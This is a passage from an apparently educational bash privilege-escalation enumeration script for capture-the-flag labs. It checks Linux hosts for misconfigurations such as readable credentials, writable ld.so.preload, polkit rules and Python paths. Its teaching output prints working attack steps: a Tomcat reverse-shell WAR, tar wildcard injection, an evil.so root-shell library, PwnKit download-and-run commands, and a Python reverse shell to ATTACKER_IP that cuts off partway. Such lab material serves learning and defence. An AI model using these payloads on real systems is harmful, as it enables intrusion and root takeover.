                    .bash_history|.bashrc|.profile|.vimrc|.ssh|.cache|.local|.config|.gnupg)
                        # Normal hidden files, skip
                        ;;
                    *)
                        warn "Hidden file: $hidden"
                        
                        # Check if executable
                        if [ -x "$hidden" ]; then
                            vuln "Hidden EXECUTABLE: $hidden"
                        fi
                        
                        # Check if SUID
                        if [ -u "$hidden" ]; then
                            critical "Hidden SUID binary: $hidden"
                        fi
                        ;;
                esac
            done
            
            # Check for hidden directories
            find "$dir" -maxdepth 2 -name ".*" -type d 2>/dev/null | while read hidden_dir; do
                case "$(basename "$hidden_dir")" in
                    .ssh|.gnupg|.cache|.local|.config)
                        # Normal, skip
                        ;;
                    *)
                        warn "Hidden directory: $hidden_dir"
                        ;;
                esac
            done
        fi
    done
}

# ═══════════════════════════════════════════════════════════════
# ADDITIONAL ENUMERATION MODULES
# ═══════════════════════════════════════════════════════════════

# === SMB/SAMBA ENUMERATION ===
enum_smb() {
    section "SMB/SAMBA SHARE ENUMERATION"
    
    explain_concept "SMB/Samba Shares" \
        "SMB (Server Message Block) shares allow file sharing over a network. Misconfigurations can expose sensitive files or allow unauthorized access." \
        "Many systems allow 'null sessions' (no authentication) or have shares with weak permissions. Windows and Linux both use SMB/Samba for file sharing. HTB boxes frequently have readable or writable shares containing flags or credentials." \
        "Exploitation:\n  1. Check for null session: smbclient -N -L //TARGET\n  2. List shares: smbmap -H TARGET\n  3. Access share: smbclient //TARGET/share -N\n  4. Look for writable shares for payload delivery"
    
    # Check if SMB service is actually running
    local smb_running=0
    if systemctl is-active --quiet smbd 2>/dev/null || systemctl is-active --quiet nmbd 2>/dev/null; then
        smb_running=1
        warn "SMB service is ACTIVE"
    fi
    
    # Check if SMB tools are available
    if ! command -v smbclient >/dev/null 2>&1; then
        warn "smbclient not installed - cannot enumerate SMB shares"
        teach "Install with: apt install smbclient"
        return
    fi
    
    # Only check for network enumeration if service is running
    if [ $smb_running -eq 1 ]; then
        # Check for SMB ports
        if netstat -tuln 2>/dev/null | grep -qE ":445 |:139 "; then
            info "SMB ports detected (445 or 139)"
            
            # Try localhost enumeration
            info "Attempting null session enumeration on localhost..."
            local smb_shares=$(smbclient -N -L //127.0.0.1 2>/dev/null | grep "Disk" | awk '{print $1}')
            
            if [ -n "$smb_shares" ]; then
                critical "SMB shares accessible with null session"
                echo "$smb_shares" | while read share; do
                    log "  Share: $share"
                    
                    # Try to access the share
                    if smbclient -N "//127.0.0.1/$share" -c "ls" 2>/dev/null | grep -q "."; then
                        critical "Share $share is READABLE without authentication"
                        teach "Access with: smbclient -N //127.0.0.1/$share"
                    fi
                done
            else
                ok "No null session access to SMB shares"
            fi
        else
            ok "SMB ports not listening"
        fi
    fi
    
    # Check for Samba config (regardless of service status)
    if [ -r /etc/samba/smb.conf ]; then
        if [ $smb_running -eq 1 ]; then
            info "Checking Samba configuration (service is running)..."
        else
            info "Samba configuration found but service is not running"
        fi
        
        # Only flag as vulnerability if service is actually running
        if [ $smb_running -eq 1 ]; then
            # Check for writable shares
            if sed 's/[;#].*//' /etc/samba/smb.conf | grep -v '^[[:space:]]*$' | grep -A 5 "\[.*\]" | grep -q "writable = yes\|read only = no"; then
                vuln "Writable SMB shares configured in active service"
                sed 's/[;#].*//' /etc/samba/smb.conf | grep -A 5 "writable = yes\|read only = no" | head -10
                teach "Check share permissions and accessible paths"
            fi
            
            # Check for guest access
            if sed 's/[;#].*//' /etc/samba/smb.conf | grep -v '^[[:space:]]*$' | grep -qi "guest.*ok.*yes\|map.*to.*guest\|usershare.*allow.*guests.*yes"; then
                vuln "Guest access configured in active Samba service"
                warn "SMB shares allow guest access or map failed logins to guest"
                teach "Guest can access shares without authentication"
            fi
        else
            ok "Samba configured but service is inactive - no active vulnerability"
        fi
    fi
}
# === EXPOSED .GIT DIRECTORY ===
enum_git_exposure() {
    section "EXPOSED .GIT DIRECTORY ENUMERATION"
    
    explain_concept "Exposed .git Directories" \
        "Web applications sometimes deploy with their .git directory accessible, exposing the entire source code repository including commit history." \
        "Developers deploy code using 'git clone' or 'git pull' in the web root, forgetting that .git/ contains the complete repository. This includes all commits, deleted files, configuration with credentials, and development history. HTB boxes love this misconfiguration." \
        "Exploitation:\n  1. Check: curl http://target/.git/config\n  2. Dump repo: git-dumper http://target/.git /output/dir\n  3. Review history: git log --all\n  4. Search for secrets: git log -p | grep -i password"
    
    # Check common web roots for .git
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
    
    for webroot in "${web_roots[@]}"; do
        if [ -d "$webroot/.git" ]; then
            critical "EXPOSED .git directory: $webroot/.git"
            vuln "Git repository in web root: $webroot/.git"
            
            if [ -r "$webroot/.git/config" ]; then
                critical "Git config readable - may contain credentials"
                info "Git config location: $webroot/.git/config"
                
                # Check for remote URLs with credentials
                if grep -E "https://.*:.*@" "$webroot/.git/config" 2>/dev/null | grep -q "."; then
                    critical "Git remote URL contains embedded credentials"
                    grep -E "url = " "$webroot/.git/config" 2>/dev/null
                fi
            fi
            
            # Check git logs for interesting commits
            if [ -d "$webroot/.git" ]; then
                cd "$webroot" 2>/dev/null && {
                    info "Checking git commit history..."
                    local commit_count=$(git log --all 2>/dev/null | grep "^commit" | wc -l)
                    if [ $commit_count -gt 0 ]; then
                        warn "Repository has $commit_count commits - review history for secrets"
                        teach "Commands to review:"
                        teach "  cd $webroot"
                        teach "  git log --all"
                        teach "  git log -p | grep -i 'password\\|secret\\|key'"
                        teach "  git show [commit-hash]"
                    fi
                }
            fi
            
            teach "If accessible via web:"
            teach "  1. Use git-dumper to clone: git-dumper http://target/.git /output"
            teach "  2. Review all branches: git branch -a"
            teach "  3. Check deleted files: git log --diff-filter=D --summary"
        fi
    done
    
    # Check if in a git repo currently
    if [ -d ".git" ] && [ -r ".git/config" ]; then
        warn "Current directory is a git repository"
        info "Git config: ./.git/config"
        
        if git log -p 2>/dev/null | grep -iE "password|secret|key|token" | head -3 | grep -q "."; then
            vuln "Git history contains potential secrets"
            teach "Review with: git log -p | grep -i password"
        fi
    fi
}

# === TOMCAT MANAGER ENUMERATION ===
enum_tomcat() {
    section "APACHE TOMCAT ENUMERATION"
    
    explain_concept "Tomcat Manager Application" \
        "Apache Tomcat's manager application allows deploying WAR files. Default credentials or weak passwords give instant code execution." \
        "Tomcat manager (/manager/html) is used to deploy web applications. If accessible with default or weak credentials, you can upload a malicious WAR file containing a web shell. This is essentially RCE with one upload. HTB loves Tomcat boxes." \
        "Exploitation:\n  1. Access /manager/html\n  2. Try default creds: tomcat:tomcat, admin:admin, tomcat:s3cret\n  3. Generate WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war\n  4. Upload via manager interface\n  5. Trigger: curl http://target:8080/shell/"
    
    # Check for Tomcat ports
    if netstat -tuln 2>/dev/null | grep -qE ":8080 |:8009 "; then
        warn "Tomcat ports detected (8080 or 8009)"
        
        # Check for Tomcat installation
        local tomcat_dirs=("/opt/tomcat" "/usr/share/tomcat" "/var/lib/tomcat" "/opt/apache-tomcat")
        
        for tomcat_dir in "${tomcat_dirs[@]}"; do
            if [ -d "$tomcat_dir" ]; then
                info "Tomcat installation found: $tomcat_dir"
                
                # Check tomcat-users.xml
                if [ -r "$tomcat_dir/conf/tomcat-users.xml" ]; then
                    critical "tomcat-users.xml is READABLE: $tomcat_dir/conf/tomcat-users.xml"
                    
                    if grep -E "role.*manager" "$tomcat_dir/conf/tomcat-users.xml" 2>/dev/null | grep -q "."; then
                        critical "Manager role configured with credentials"
                        vuln "Tomcat manager credentials exposed in tomcat-users.xml"
                        grep -E "role.*manager|user.*password" "$tomcat_dir/conf/tomcat-users.xml" 2>/dev/null | head -5
                        
                        teach "Extract credentials and access manager at:"
                        teach "  http://localhost:8080/manager/html"
                    fi
                fi
                
                # Check for manager application
                if [ -d "$tomcat_dir/webapps/manager" ]; then
                    warn "Tomcat manager application is deployed"
                    teach "Common default credentials to try:"
                    teach "  tomcat:tomcat"
                    teach "  admin:admin"
                    teach "  tomcat:s3cret"
                    teach "  admin:password"
                fi
            fi
        done
    else
        ok "Tomcat ports not detected"
    fi
}

# === SPRING BOOT ACTUATOR ===
enum_spring_actuator() {
    section "SPRING BOOT ACTUATOR ENUMERATION"
    
    explain_concept "Spring Boot Actuators" \
        "Spring Boot applications expose 'actuator' endpoints for monitoring and management. Misconfigured actuators leak sensitive information or allow RCE." \
        "Spring Boot's actuator endpoints provide app metrics, health info, and environment variables. If exposed without authentication, they leak database passwords, API keys, and app config. Some endpoints like /jolokia or /env can lead to RCE." \
        "Common endpoints:\n  /actuator - Lists available endpoints\n  /actuator/env - Environment variables (passwords!)\n  /actuator/health - App health (sometimes shows DB status)\n  /actuator/mappings - All routes\n  /actuator/heapdump - Memory dump (credentials in memory)"
    
    # Check for Java processes
    if ps aux | grep -iE "java.*spring|spring.*boot" | grep -v grep | grep -q "."; then
        warn "Spring Boot application detected in running processes"
        
        info "Checking common Spring Boot actuator endpoints..."
        
        # Check for listening ports that might be Spring Boot
        if netstat -tuln 2>/dev/null | grep -qE ":8080 |:8081 |:8443 "; then
            info "Potential Spring Boot ports detected"
            
            teach "If you have web access, check these endpoints:"
            teach "  curl http://target:8080/actuator"
            teach "  curl http://target:8080/actuator/env"
            teach "  curl http://target:8080/actuator/heapdump"
            teach "  curl http://target:8080/actuator/mappings"
            teach "  curl http://target:8080/env (older Spring Boot)"
        fi
    fi
    
    # Check web roots for Spring Boot applications
    local web_roots=("/var/www" "/opt" "/usr/local")
    
    for webroot in "${web_roots[@]}"; do
        find "$webroot" -name "*.jar" 2>/dev/null | head -10 | while read jar; do
            if unzip -l "$jar" 2>/dev/null | grep -q "spring-boot"; then
                warn "Spring Boot JAR found: $jar"
                
                # Check for application.properties or application.yml
                local app_dir=$(dirname "$jar")
                if [ -r "$app_dir/application.properties" ]; then
                    vuln "Spring Boot config readable: $app_dir/application.properties"
                    
                    if grep -iE "password|secret|key" "$app_dir/application.properties" 2>/dev/null | head -3 | grep -q "."; then
                        critical "Spring Boot config contains credentials"
                        grep -iE "password|secret|key" "$app_dir/application.properties" 2>/dev/null | head -3
                    fi
                fi
                
                if [ -r "$app_dir/application.yml" ]; then
                    vuln "Spring Boot config readable: $app_dir/application.yml"
                    
                    if grep -iE "password|secret|key" "$app_dir/application.yml" 2>/dev/null | head -3 | grep -q "."; then
                        critical "Spring Boot YAML config contains credentials"
                        grep -iE "password|secret|key" "$app_dir/application.yml" 2>/dev/null | head -3
                    fi
                fi
            fi
        done
    done
}

# === WORDPRESS EXTENDED ===
enum_wordpress_extended() {
    section "WORDPRESS EXTENDED ENUMERATION"
    
    explain_concept "WordPress Vulnerabilities" \
        "WordPress sites have many attack surfaces: plugins, themes, xmlrpc.php, user enumeration via JSON API, and configuration backups." \
        "WordPress is extremely common and frequently misconfigured. Plugin/theme vulnerabilities are constantly discovered. The xmlrpc.php file allows authentication brute forcing with amplification. The wp-json API leaks usernames. Config backups expose database credentials." \
        "Attack vectors:\n  • Plugin/theme vulnerabilities (check version against exploit-db)\n  • User enumeration: curl http://site/wp-json/wp/v2/users\n  • xmlrpc.php brute force amplification\n  • wp-config.php backups (.bak, .old, ~, .save)\n  • Unprotected wp-admin/install.php"
    
    # Check for WordPress installations
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
    
    for webroot in "${web_roots[@]}"; do
        if [ -f "$webroot/wp-config.php" ]; then
            info "WordPress installation found: $webroot"
            
            # Check for wp-config.php
            if [ -r "$webroot/wp-config.php" ]; then
                critical "wp-config.php is READABLE - contains database credentials"
                vuln "WordPress config readable: $webroot/wp-config.php"
                
                # Extract DB credentials
                if grep -E "DB_PASSWORD|DB_USER|DB_NAME" "$webroot/wp-config.php" 2>/dev/null | grep -q "."; then
                    critical "Database credentials in wp-config.php"
                    grep -E "DB_PASSWORD|DB_USER|DB_NAME|DB_HOST" "$webroot/wp-config.php" 2>/dev/null | grep -v "put your"
                fi
                
                # Check for authentication keys
                if grep -E "AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY" "$webroot/wp-config.php" 2>/dev/null | grep -q "put your unique phrase here"; then
                    warn "WordPress using default authentication keys"
                    teach "Default keys = weaker session security"
                fi
            fi
            
            # Check for wp-config backups
            find "$webroot" -name "wp-config.php*" -o -name "*wp-config*" 2>/dev/null | grep -vE "wp-config.php$" | while read backup; do
                if [ -r "$backup" ]; then
                    critical "wp-config backup found: $backup"
                    vuln "WordPress config backup: $backup"
                fi
            done
            
            # Check xmlrpc.php
            if [ -f "$webroot/xmlrpc.php" ]; then
                warn "xmlrpc.php present - enables brute force amplification"
                teach "Test if enabled: curl -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://target/xmlrpc.php"
                teach "If enabled, can amplify brute force attacks significantly"
            fi
            
            # Check for wp-json API
            if [ -d "$webroot/wp-json" ] || [ -d "$webroot/wp-includes/rest-api" ]; then
                info "WordPress REST API present"
                teach "Enumerate users: curl http://target/wp-json/wp/v2/users"
                teach "Leaked usernames can be used for brute forcing"
            fi
            
            # Check plugins
            if [ -d "$webroot/wp-content/plugins" ]; then
                info "Checking installed plugins..."
                local plugin_count=$(ls -1 "$webroot/wp-content/plugins" 2>/dev/null | wc -l)
                warn "Found $plugin_count installed plugins"
                
                # List plugins
                ls -1 "$webroot/wp-content/plugins" 2>/dev/null | head -10 | while read plugin; do
                    log "  Plugin: $plugin"
                    
                    # Check for readme files that reveal version
                    if [ -f "$webroot/wp-content/plugins/$plugin/readme.txt" ]; then
                        local version=$(grep -i "stable tag" "$webroot/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | head -1)
                        if [ -n "$version" ]; then
                            info "  Version: $version"
                            teach "  Check exploit-db for: $plugin $version"
                        fi
                    fi
                done
                
                teach "\nPlugin enumeration:"
                teach "  Search exploit-db: searchsploit wordpress [plugin-name]"
                teach "  Or use: wpscan --url http://target --enumerate p"
            fi
        fi
    done
}


# ═══════════════════════════════════════════════════════════════
# === TOOLS AVAILABILITY ===
enum_tools() {
    section "INSTALLED TOOLS & COMPILERS"
    
    teach "Available tools affect exploitation options. Compilers let you build exploits. Network tools enable pivoting."
    
    local tools=(
        "gcc:Compile C exploits"
        "g++:Compile C++ exploits"
        "python:Run exploit scripts and pty shells"
        "python3:Modern Python exploits"
        "perl:Run Perl exploits"
        "ruby:Run Ruby exploits"
        "wget:Download exploits and tools"
        "curl:Download files and interact with APIs"
        "nc:Netcat for reverse shells"
        "ncat:Modern netcat with SSL support"
        "socat:Advanced socket relay tool"
        "nmap:Port scanning and service detection"
        "tcpdump:Packet capture for network analysis"
        "git:Clone exploit repositories"
        "docker:Container management (check group!)"
        "kubectl:Kubernetes control (if in cluster)"
    )
    
    for tool_desc in "${tools[@]}"; do
        local tool=$(echo "$tool_desc" | cut -d: -f1)
        local desc=$(echo "$tool_desc" | cut -d: -f2)
        
        if command -v "$tool" >/dev/null 2>&1; then
            info "✓ $tool - $desc"
        fi
    done
    
    # Check for language interpreters
    if command -v python >/dev/null 2>&1 || command -v python3 >/dev/null 2>&1; then
        teach "Python available - use for pty shells: python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    fi
}

# === WILDCARD INJECTION ===
enum_wildcards() {
    section "WILDCARD INJECTION OPPORTUNITIES"
    
    explain_concept "Wildcard Injection" \
        "When scripts use wildcards (*, ?) with commands, specially named files can be interpreted as command arguments." \
        "Shell expands wildcards before passing to command. If script does 'tar -czf backup.tar.gz *', files named '--checkpoint=1' become arguments to tar. Commands process arguments before files." \
        "Common targets:\n  • tar with * → --checkpoint-action\n  • rsync with * → -e option\n  • chown with * → --reference\n  • Any command taking options starting with -"
    
    # Look for scripts using wildcards
    find /var/scripts /usr/local/bin /opt -name "*.sh" -readable 2>/dev/null | while read script; do
        if grep -E "tar.*\*|rsync.*\*|chown.*\*|chmod.*\*" "$script" 2>/dev/null | grep -q "."; then
            warn "Script uses wildcards: $script"
            grep -E "tar.*\*|rsync.*\*|chown.*\*|chmod.*\*" "$script" 2>/dev/null | while read line; do
                log "  $line"
            done
            
            teach "Exploitation example for tar:"
            teach "  echo '#!/bin/sh' > shell.sh"
            teach "  echo 'chmod u+s /bin/bash' >> shell.sh"
            teach "  chmod +x shell.sh"
            teach "  touch -- '--checkpoint=1'"
            teach "  touch -- '--checkpoint-action=exec=sh shell.sh'"
        fi
    done
}
# === WRITABLE LD.SO.PRELOAD ===
enum_ld_preload() {
    section "LD.SO.PRELOAD ANALYSIS"
    
    explain_concept "ld.so.preload File" \
        "The /etc/ld.so.preload file forces the dynamic linker to load specified libraries before all others, for every program execution." \
        "If writable, you can force your malicious library to load into every process that starts, including those running as root. This gives instant root access the next time any SUID binary or root process starts." \
        "Exploitation:\n  1. Create malicious library: gcc -shared -fPIC -o /tmp/evil.so evil.c\n  2. Add to preload: echo '/tmp/evil.so' > /etc/ld.so.preload\n  3. Wait for or trigger any SUID binary execution\n  4. Your code runs as root"
    
    if [ -f /etc/ld.so.preload ]; then
        if [ -w /etc/ld.so.preload ]; then
            critical "ld.so.preload is WRITABLE - Instant root via library injection"
            vuln "/etc/ld.so.preload is WRITABLE!"
            teach "Malicious library template (evil.c):"
            teach "  #include <stdio.h>"
            teach "  #include <sys/types.h>"
            teach "  #include <stdlib.h>"
            teach "  void _init() {"
            teach "      unsetenv(\"LD_PRELOAD\");"
            teach "      setgid(0); setuid(0);"
            teach "      system(\"/bin/bash -p\");"
            teach "  }"
            teach "Compile and inject: gcc -shared -fPIC -o /tmp/evil.so evil.c && echo '/tmp/evil.so' > /etc/ld.so.preload"
        else
            ok "/etc/ld.so.preload exists but not writable"
        fi
    else
        ok "/etc/ld.so.preload does not exist"
    fi
    
    # Check ld.so.conf.d directory
    if [ -d /etc/ld.so.conf.d ]; then
        if [ -w /etc/ld.so.conf.d ]; then
            critical "ld.so.conf.d directory WRITABLE - Add malicious library paths"
            vuln "/etc/ld.so.conf.d/ is WRITABLE!"
            teach "Create config file pointing to your malicious library directory"
            teach "  echo '/tmp' > /etc/ld.so.conf.d/evil.conf && ldconfig"
        fi
    fi
}

# === SYSTEMD TIMERS ===
enum_systemd_timers() {
    section "SYSTEMD TIMER ANALYSIS"
    
    explain_concept "Systemd Timers" \
        "Systemd timers are the modern replacement for cron jobs. Like services, writable timer files running as root give you code execution." \
        "Timers trigger service execution on a schedule. If you can modify a timer or its associated service that runs as root, you control what executes and when." \
        "Exploitation:\n  1. Find writable timer: /etc/systemd/system/*.timer\n  2. Modify associated service's ExecStart\n  3. Or modify timer's OnCalendar to trigger immediately\n  4. systemctl daemon-reload && systemctl start timer-name"
    
    # Check for writable timer files
    find /etc/systemd/system /lib/systemd/system -name "*.timer" -type f 2>/dev/null | while read timer; do
        if [ -w "$timer" ] && [ ! -L "$timer" ]; then
            critical "Writable systemd timer: $timer"
            vuln "Writable systemd timer: $timer"
            
            # Find associated service
            local service=$(grep "Unit=" "$timer" 2>/dev/null | cut -d= -f2)
            if [ -n "$service" ]; then
                info "  Associated service: $service"
                if [ -w "/etc/systemd/system/$service" ] || [ -w "/lib/systemd/system/$service" ]; then
                    critical "  Associated service is ALSO writable!"
                fi
            fi
        fi
    done
    
    # List active timers
    if command -v systemctl >/dev/null 2>&1; then
        local timer_count=$(systemctl list-timers --no-pager 2>/dev/null | grep -c "\.timer")
        if [ $timer_count -gt 0 ]; then
            info "Active timers: $timer_count"
            teach "List all timers: systemctl list-timers"
            teach "Check timer details: systemctl cat <timer-name>"
        fi
    fi
}

# === POLKIT/PKEXEC ===
enum_polkit() {
    section "POLKIT/PKEXEC ANALYSIS"
    
    explain_concept "Polkit (PolicyKit)" \
        "Polkit allows unprivileged processes to communicate with privileged ones. pkexec is like sudo but uses polkit for authorization." \
        "Desktop Linux needs fine-grained access control. Example: You click 'Install Updates' - the GUI runs as your user but needs root to install packages. Polkit acts as the middleman, checking if you're authorized. pkexec is the command-line equivalent of sudo, but instead of /etc/sudoers, it uses polkit policies." \
        "How it works:\n  1. Unprivileged process wants to do privileged action\n  2. Asks polkit: 'Am I allowed?'\n  3. Polkit checks policies in /usr/share/polkit-1/actions/\n  4. May prompt for password\n  5. If authorized, polkit grants access\n\nWhy vulnerabilities matter:\n  • pkexec is SUID root (runs as root)\n  • Processes user input (authentication, environment)\n  • Complex codebase handling security decisions\n  • Used by default on most Linux desktops"
    
    if ! command -v pkexec >/dev/null 2>&1; then
        ok "pkexec not installed"
        return
    fi
    
    local pkexec_path=$(which pkexec)
    local has_vulnerability=0
    local has_writable_rules=0
    
    info "pkexec found: $pkexec_path"
    
    # Check version for PwnKit
    local version=$(pkexec --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
    if [ -n "$version" ]; then
        info "pkexec version: $version"
        
        # Simple version comparison for 0.120
        local major=$(echo "$version" | cut -d. -f1)
        local minor=$(echo "$version" | cut -d. -f2)
        
        if [ "$major" -eq 0 ] && [ "$minor" -lt 120 ]; then
            has_vulnerability=1
            critical "pkexec vulnerable to PwnKit (CVE-2021-4034) - Instant root"
            vuln "pkexec version $version is vulnerable to CVE-2021-4034!"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CVE-2021-4034 - PwnKit (Memory Corruption)"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  A memory corruption vulnerability in pkexec that allows ANY"
            teach "  user to get root WITHOUT needing a password or any special"
            teach "  permissions. One of the most critical vulnerabilities of 2022."
            teach ""
            teach "BACKGROUND - What is pkexec:"
            teach "  pkexec is like sudo but uses polkit for authorization."
            teach "  Example: pkexec /bin/bash (asks for password, gives root shell)"
            teach "  It's SUID root, meaning it runs with root privileges."
            teach ""
            teach "WHY IT EXISTS - The Technical Flaw:"
            teach "  When you run a program in Linux, it receives arguments in an array."
            teach "  Example: ./program arg1 arg2 arg3"
            teach "  The array looks like: ['program', 'arg1', 'arg2', 'arg3', NULL]"
            teach ""
            teach "  pkexec makes a critical mistake when handling this array:"
            teach "  1. It counts the number of arguments"
            teach "  2. It removes the first argument (the program name)"
            teach "  3. It shifts everything down"
            teach ""
            teach "  THE BUG:"
            teach "  If you call pkexec with ZERO arguments (no command to execute),"
            teach "  pkexec tries to remove argument[0] but there's nothing there!"
            teach ""
            teach "  What happens:"
            teach "  1. pkexec receives: argv[0] = NULL (empty)"
            teach "  2. Tries to remove argv[0]"
            teach "  3. Shifts down, but shifts ENVIRONMENT variables instead"
            teach "  4. Now environment variables are in the argument array"
            teach "  5. pkexec processes them as if they were arguments"
            teach "  6. Attacker can inject malicious environment variables"
            teach "  7. These get executed with root privileges"
            teach ""
            teach "SIMPLIFIED ANALOGY:"
            teach "  Imagine a security guard checking a list of people:"
            teach "  1. Guard expects: [Name, ID, Purpose]"
            teach "  2. You give empty list: []"
            teach "  3. Guard removes first item (nothing there)"
            teach "  4. Guard accidentally reads from the NEXT paper (environment vars)"
            teach "  5. Treats that paper as if it was the approved list"
            teach "  6. You've tricked the guard into reading your fake approval"
            teach ""
            teach "WHY IT EXISTED FOR 12+ YEARS:"
            teach "  The vulnerability was introduced in pkexec's first version (2009)."
            teach "  It's a subtle bug - only triggers when argc = 0, which normally"
            teach "  never happens (programs always have at least one argument)."
            teach "  Took until 2021 for someone to think: 'What if argc = 0?'"
            teach ""
            teach "HOW TO EXPLOIT:"
            teach ""
            teach "  Method 1 - Use public exploit:"
            teach "  1. Download PwnKit exploit:"
            teach "     wget https://github.com/ly4k/PwnKit/raw/main/PwnKit"
            teach "  2. Make it executable:"
            teach "     chmod +x PwnKit"
            teach "  3. Run it:"
            teach "     ./PwnKit"
            teach "  4. Get root shell immediately"
            teach ""
            teach "  Method 2 - Compile from source:"
            teach "  1. Download C exploit code:"
            teach "     wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c"
            teach "  2. Compile:"
            teach "     gcc cve-2021-4034.c -o exploit"
            teach "  3. Run:"
            teach "     ./exploit"
            teach ""
            teach "  The exploit works by:"
            teach "  1. Calling pkexec with argc = 0 (no arguments)"
            teach "  2. Setting malicious environment variable (GCONV_PATH)"
            teach "  3. GCONV_PATH points to attacker's shared library"
            teach "  4. pkexec loads the malicious library as root"
            teach "  5. Library executes attacker's code = root shell"
            teach ""
            teach "IMPACT:"
            teach "  • Works on almost ALL Linux distributions"
            teach "  • No password or special permissions needed"
            teach "  • ANY user (including restricted users) → Root"
            teach "  • Existed since 2009, affected billions of systems"
            teach "  • One of the most widespread Linux vulnerabilities ever"
            log ""
        else
            ok "pkexec version appears patched for PwnKit"
        fi
    fi
    
    # Check polkit rules for misconfigurations
    if [ -d /etc/polkit-1/rules.d ]; then
        find /etc/polkit-1/rules.d -name "*.rules" -type f 2>/dev/null | while read rule; do
            if [ -w "$rule" ]; then
                has_writable_rules=1
                critical "Writable polkit rule: $rule"
                vuln "Writable polkit rule: $rule"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  Writable Polkit Rules - Policy Manipulation"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT THIS MEANS:"
                teach "  Polkit rules control who can do what privileged actions."
                teach "  If you can write to rule files, you can grant yourself access."
                teach ""
                teach "HOW POLKIT RULES WORK:"
                teach "  Rules are JavaScript files that define policies."
                teach "  Example rule:"
                teach "  polkit.addRule(function(action, subject) {"
                teach "    if (subject.user == \"bob\") {"
                teach "      return polkit.Result.YES;  // Bob can do anything"
                teach "    }"
                teach "  });"
                teach ""
                teach "EXPLOITATION:"
                teach "  1. Create a permissive rule:"
                teach "     echo 'polkit.addRule(function(action, subject) {' > $rule"
                teach "     echo '  if (subject.user == \"$(whoami)\") {' >> $rule"
                teach "     echo '    return polkit.Result.YES;' >> $rule"
                teach "     echo '  }' >> $rule"
                teach "     echo '});' >> $rule"
                teach ""
                teach "  2. Now you can run any pkexec command:"
                teach "     pkexec /bin/bash"
                log ""
            fi
        done
    fi
    
    # Only show additional educational content if something was found
    if [ $has_vulnerability -eq 1 ] || [ $has_writable_rules -eq 1 ]; then
        log ""
        teach "═══════════════════════════════════════════════════════════════"
        teach "POLKIT - UNDERSTANDING THE SYSTEM"
        teach "═══════════════════════════════════════════════════════════════"
        teach ""
        teach "POLKIT vs SUDO:"
        teach "  SUDO: Simple file (/etc/sudoers), binary decision, CLI-focused"
        teach "  POLKIT: Policy framework, complex rules, GUI-focused"
        teach ""
        teach "WHY POLKIT EXISTS:"
        teach "  Desktop GUIs need smooth privilege delegation without sudo prompts."
        teach "  Examples: Software updates, USB mounting, network configuration"
        teach ""
        teach "COMPONENTS:"
        teach "  • pkexec: Command-line tool (SUID root)"
        teach "  • polkitd: Background daemon making decisions"
        teach "  • Policies: XML in /usr/share/polkit-1/actions/"
        teach "  • Rules: JavaScript in /etc/polkit-1/rules.d/"
        teach ""
        teach "SECURITY IMPLICATIONS:"
        teach "  • pkexec is SUID root → bugs = privilege escalation"
        teach "  • Writable rules = unauthorized access"
        teach "  • Race conditions in polkitd = bypass authorization"
        log ""
    fi
}
# === SNAP PACKAGES ===
enum_snap() {
    section "SNAP PACKAGE ANALYSIS"
    
    explain_concept "Snap Packages & Confinement" \
        "Snap packages can run in different confinement modes. 'devmode' disables security, 'classic' has no isolation. These can be exploited." \
        "Snaps in devmode or classic confinement have full system access. If you can modify snap applications or their data, you might execute code with fewer restrictions. Dirty_sock exploited snapd socket permissions." \
        "Check:\n  â€¢ Snaps in devmode (snap list)\n  â€¢ Writable snap directories\n  â€¢ snapd socket permissions\n  â€¢ Dirty_sock vulnerability (CVE-2019-7304)"
    
    if command -v snap >/dev/null 2>&1; then
        info "Snap is installed"
        
        # Check for devmode/classic snaps
        snap list 2>/dev/null | grep -E "devmode|classic" | while read line; do
            warn "Snap with relaxed confinement: $line"
        done
        
        # Check snapd socket
        if [ -S /run/snapd.socket ]; then
            info "snapd socket exists: /run/snapd.socket"
            
            if [ -w /run/snapd.socket ]; then
                critical "snapd socket is WRITABLE - Potential Dirty_sock exploit"
                vuln "snapd socket is writable!"
                teach "Check for Dirty_sock vulnerability (CVE-2019-7304)"
                teach "  snapd versions < 2.37 vulnerable"
            fi
        fi
        
        # Check for writable snap directories
        find /snap -maxdepth 2 -type d -writable 2>/dev/null | head -5 | while read dir; do
            warn "Writable snap directory: $dir"
        done
    else
        ok "Snap not installed"
    fi
}

# === PYTHON LIBRARY PATH HIJACKING ===
enum_python_paths() {
    section "PYTHON LIBRARY PATH HIJACKING"
    
    explain_concept "Python Library Hijacking" \
        "Python searches for modules in specific directories. If you can write to these paths, you can inject malicious modules that get imported by privileged scripts." \
        "When Python imports a module, it searches sys.path in order. If an early directory is writable, you can place a malicious module there. If a root script imports it, your code runs as root." \
        "Exploitation:\n  1. Find writable path: python3 -c 'import sys; print(sys.path)'\n  2. Identify module used by root script\n  3. Create malicious module in writable path\n  4. Wait for script execution"
    
    if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
        local python_cmd=$(command -v python3 2>/dev/null || command -v python 2>/dev/null)
        
        info "Python executable: $python_cmd"
        
        # Get Python paths
        local python_paths=$($python_cmd -c "import sys; print('\n'.join(sys.path))" 2>/dev/null)
        
        info "Python module search paths:"
        echo "$python_paths" | while read path; do
            [ -z "$path" ] && continue
            
            if [ -d "$path" ]; then
                if [ -w "$path" ]; then
                    critical "WRITABLE Python path: $path - Hijack imports for privilege escalation"
                    vuln "Writable Python library path: $path"
                    teach "Create malicious module here that matches imports in root scripts"
                    teach "Example malicious module (os.py):"
                    teach "  import socket,subprocess,os"
                    teach "  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)"
                    teach "  s.connect(('ATTACKER_IP',4444))"
                    teach "  os.dup2(s.fileno(),0)"
